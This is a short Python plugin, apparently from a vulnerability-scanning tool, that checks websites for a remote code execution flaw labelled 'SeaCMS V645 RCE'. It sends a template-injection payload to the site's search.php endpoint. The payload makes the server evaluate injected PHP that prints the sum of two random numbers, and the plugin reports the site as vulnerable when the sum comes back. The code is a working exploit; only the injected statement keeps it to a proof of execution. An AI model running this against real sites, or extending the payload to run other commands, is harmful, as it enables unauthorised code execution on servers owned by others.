#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'SeaCMS V645 RCE',

      'level'     :   'high',
      'FOFA'      :   '',
      'author'    :   'ppxfx',
      'ifbug'     :   False,
  }
  return ret
def randomInt(n,m):#返回某个范围中的int
  import random
  return random.randint(n,m)
def run(url,ua):
  rand1 = randomInt(200000000,210000000)
  rand2 = randomInt(200000000,210000000)
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/search.php?searchtype=5'
  data = """searchtype=5&order=}{end if} {if:1)print("""+f"""{rand1}%2b{rand2});"""+"""if(1}{end if}"""
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and str(rand1+rand2) in res.text:
      # ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret